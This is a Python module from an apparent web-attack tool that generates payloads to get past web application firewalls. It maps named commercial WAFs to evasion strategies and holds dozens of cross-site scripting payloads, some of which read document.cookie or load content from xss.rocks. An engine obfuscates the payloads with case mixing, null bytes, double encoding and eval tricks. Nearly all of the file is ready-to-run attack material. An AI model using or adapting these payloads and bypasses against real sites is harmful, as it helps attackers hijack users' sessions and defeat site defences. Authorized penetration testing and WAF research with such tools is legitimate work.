"""
modules/waf_bypass.py — Advanced WAF bypass module.

Combines:
  - Real-world bypass techniques from public ExploitDB / OWASP research
  - Context-aware encoding via modules/encoder.py
  - Browser-specific payload variants
  - Adaptive strategy selection based on WAF fingerprint
"""

from typing import Dict, List, Optional
from core.models import InjectionContext
from modules.encoder import (encode_for_context, to_html_entities,
                              to_hex_entities, to_js_unicode, to_js_hex)


# ── WAF-specific bypass strategy registry ─────────────────────────────────
#
# Each entry maps a detected WAF name to a prioritised list of
# technique names. The engine tries them in order and returns the
# first batch that produces new unique payloads.
#
WAF_STRATEGY_MAP: Dict[str, List[str]] = {
    "Cloudflare":        ["case", "comments", "whitespace", "entities", "eval_obf"],
    "AWS WAF":           ["double_url", "entities", "null_byte", "eval_obf"],
    "Akamai":            ["case", "double_url", "comments", "fullwidth"],
    "ModSecurity":       ["null_byte", "comments", "whitespace", "nested_tags"],
    "Imperva/Incapsula": ["case", "entities", "eval_obf", "double_url"],
    "Sucuri":            ["case", "comments", "entities"],
    "F5 BIG-IP":         ["null_byte", "whitespace", "eval_obf"],
    "Wordfence":         ["case", "entities", "double_url"],
    "Barracuda":         ["comments", "whitespace", "eval_obf"],
    "Fortinet":          ["double_url", "entities", "null_byte"],
    "_default":          ["case", "comments", "whitespace", "entities",
                          "double_url", "eval_obf", "null_byte", "fullwidth"],
}

# ── ExploitDB / OWASP / XSS Hunter — curated real-world payloads ──────────
REAL_WORLD_PAYLOADS: List[str] = [
    # === OWASP XSS Filter Evasion Cheat Sheet ===
    # JS events without quotes
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')>",
    "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert('XSS')>",
    "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert('XSS')>",

    # Embedded tab / newline in URL schemes
    "<IMG SRC=\"jav\tascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",

    # Null byte variations
    "<SCR\x00IPT>alert('XSS')</SCR\x00IPT>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",

    # Div-based event injection
    "<DIV STYLE=\"width: expression(alert('XSS'));\">",
    "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",

    # META tag refresh / redirect
    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
    "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",

    # LINK / STYLE import
    "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
    "<STYLE>@import'javascript:alert(\"XSS\")';</STYLE>",
    "<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xss.xml#xss\")}</STYLE>",

    # Object/embed
    "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>",
    "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGltYWdlIHhsaW5rOmhyZWY9IjEiIG9uZXJyb3I9ImFsZXJ0KDEpIi8+Cjwvc3ZnPg==\">",

    # HTML5 new vectors
    "<VIDEO><SOURCE ONERROR=\"javascript:alert('XSS')\">",
    "<AUDIO SRC=x ONERROR=alert('XSS')>",
    "<BODY ONSCROLL=alert('XSS')><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><input autofocus>",

    # SVG advanced
    "<SVG ONLOAD=alert('XSS')>",
    "<SVG/ONLOAD=alert('XSS')>",
    "<svg><script>alert&#40;1&#41;</script>",
    "<svg><script>alert&lpar;1&rpar;</script>",
    "<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",

    # Frame / window navigation
    "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
    "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>",

    # Angular / template injection
    "{{constructor.constructor('alert(1)')()}}",
    "{{$on.constructor('alert(1)')()}}",
    "{{7*7}}{{alert(1)}}",

    # Vue injection
    "<div v-html=\"'<img src=x onerror=alert(1)>'\">",

    # XSS via CSS injection (IE)
    "<XSS STYLE=\"behavior: url(xss.htc);\">",

    # PHP/ASP tag confusion
    "<? echo(\"<scr);\"; echo(\"ipt>alert('XSS')</script>\"); ?>",

    # Unicode / UTF-7 / UTF-8 overlong
    "+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-",

    # Hex encoded full payload
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",

    # DOM-targeted: hash fragment
    "#\"><img src=x onerror=alert(1)>",
    "#javascript:alert(1)",

    # Browser-specific: Firefox < 83 SVG
    "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\">",

    # Browser-specific: Chrome mXSS (mutation XSS)
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",

    # Stored / polyglot payloads
    "'\"><img src=x onerror=alert(document.domain)>",
    "\"><svg/onload=alert(document.location)>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
]

# ── Browser-specific payload variants ─────────────────────────────────────
BROWSER_PAYLOADS: Dict[str, List[str]] = {
    "chrome": [
        # Chrome mXSS via template/noscript
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<details/open/ontoggle=alert(1)>",
    ],
    "firefox": [
        # Firefox XML namespace trick
        "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\">",
        "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">",
        "<svg><set onbegin=alert(1) attributeName=x>",
    ],
    "safari": [
        # Safari-specific srcdoc / sandbox bypass
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">",
    ],
    "ie_edge": [
        "<XSS STYLE=\"behavior: url(xss.htc);\">",
        "<DIV STYLE=\"width: expression(alert('XSS'));\">",
        "+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
    ],
}


class WafBypassEngine:
    """
    Central WAF bypass engine. Given a detected WAF name and a list of
    base payloads, returns an augmented payload list with context-appropriate
    mutations, real-world payloads, and browser variants.
    """

    def __init__(self, waf_name: Optional[str] = None):
        self.waf_name  = waf_name
        self.strategies = (
            WAF_STRATEGY_MAP.get(waf_name, [])
            + WAF_STRATEGY_MAP["_default"]
        )
        # Deduplicate strategy list but preserve order
        seen = set()
        self.strategies = [s for s in self.strategies if not (s in seen or seen.add(s))]

    def augment(
        self,
        base_payloads: List[str],
        context: InjectionContext = InjectionContext.HTML_TEXT,
        include_real_world: bool = True,
        include_browser: bool = True,
    ) -> List[str]:
        """
        Return base_payloads extended with bypass variants.
        Deduplicates automatically.
        """
        result = list(base_payloads)

        # Apply each strategy to each payload
        for payload in base_payloads[:30]:   # cap to avoid combinatorial explosion
            for technique in self.strategies:
                variants = self._apply(payload, technique, context)
                result.extend(variants)

        # Append real-world curated payloads
        if include_real_world:
            result.extend(REAL_WORLD_PAYLOADS)

        # Append browser-specific payloads
        if include_browser:
            for browser_list in BROWSER_PAYLOADS.values():
                result.extend(browser_list)

        # Context-aware encodings of base payloads
        for payload in base_payloads[:15]:
            result.extend(encode_for_context(payload, context))

        return list(dict.fromkeys(p for p in result if p))

    def _apply(self, payload: str, technique: str, context: InjectionContext) -> List[str]:
        """Apply a single bypass technique and return resulting variants."""
        fn = {
            "case":        self._case,
            "comments":    self._comments,
            "whitespace":  self._whitespace,
            "entities":    self._entities,
            "double_url":  self._double_url,
            "eval_obf":    self._eval_obf,
            "null_byte":   self._null_byte,
            "fullwidth":   self._fullwidth,
            "nested_tags": self._nested_tags,
        }.get(technique)
        return fn(payload) if fn else []

    # ── Individual bypass techniques ───────────────────────────────────────

    def _case(self, p: str) -> List[str]:
        def mixed(s):
            return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))
        return [mixed(p), p.upper(), p.lower()]

    def _comments(self, p: str) -> List[str]:
        variants = []
        for kw in ["onload", "onerror", "onfocus", "onclick"]:
            if kw in p.lower():
                i = p.lower().index(kw)
                variants.append(p[:i + 2] + "<!---->" + p[i + 2:])
        if "<script>" in p.lower():
            variants.append(p.replace("<script>", "<scr<!---->ipt>"))
        return variants

    def _whitespace(self, p: str) -> List[str]:
        variants = []
        for ws in ["\t", "\n", "\r", "%09", "%0a", "%0d", "&#9;", "&#10;"]:
            if "=" in p:
                variants.append(p.replace("=", ws + "=", 1))
            if " " in p:
                variants.append(p.replace(" ", ws, 1))
        return variants

    def _entities(self, p: str) -> List[str]:
        variants = []
        if "alert" in p:
            variants.append(p.replace("alert", to_html_entities("alert")))
            variants.append(p.replace("alert", to_hex_entities("alert")))
        if "script" in p.lower():
            variants.append(p.replace("script", to_html_entities("script")))
        return variants

    def _double_url(self, p: str) -> List[str]:
        import urllib.parse
        return [
            p.replace("<", "%253C").replace(">", "%253E"),
            urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""),
        ]

    def _eval_obf(self, p: str) -> List[str]:
        if "alert(1)" not in p:
            return []
        return [
            p.replace("alert(1)", "eval('al'+'ert(1)')"),
            p.replace("alert(1)", "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"),
            p.replace("alert(1)", "Function('alert(1)')()"),
            p.replace("alert(1)", "[].constructor.constructor('alert(1)')()"),
            p.replace("alert(1)", "(()=>{})['constructor']('alert(1)')()"),
            p.replace("alert(1)", "window['al'+'ert'](1)"),
            p.replace("alert(1)", "top['al'+'ert'](1)"),
        ]

    def _null_byte(self, p: str) -> List[str]:
        variants = []
        for kw in ["script", "onerror", "onload", "svg", "img"]:
            if kw in p.lower():
                i   = p.lower().index(kw)
                mid = len(kw) // 2
                variants.append(p[:i + mid] + "\x00" + p[i + mid:])
        return variants

    def _fullwidth(self, p: str) -> List[str]:
        def fw(s):
            out = []
            for c in s:
                if 'A' <= c <= 'Z': out.append(chr(ord(c) - ord('A') + 0xFF21))
                elif 'a' <= c <= 'z': out.append(chr(ord(c) - ord('a') + 0xFF41))
                else: out.append(c)
            return "".join(out)
        return [fw(p)]

    def _nested_tags(self, p: str) -> List[str]:
        variants = []
        if "<script>" in p.lower():
            variants.append(p.replace("<script>", "<scr<script>ipt>")
                             .replace("</script>", "</scr</script>ipt>"))
        return variants
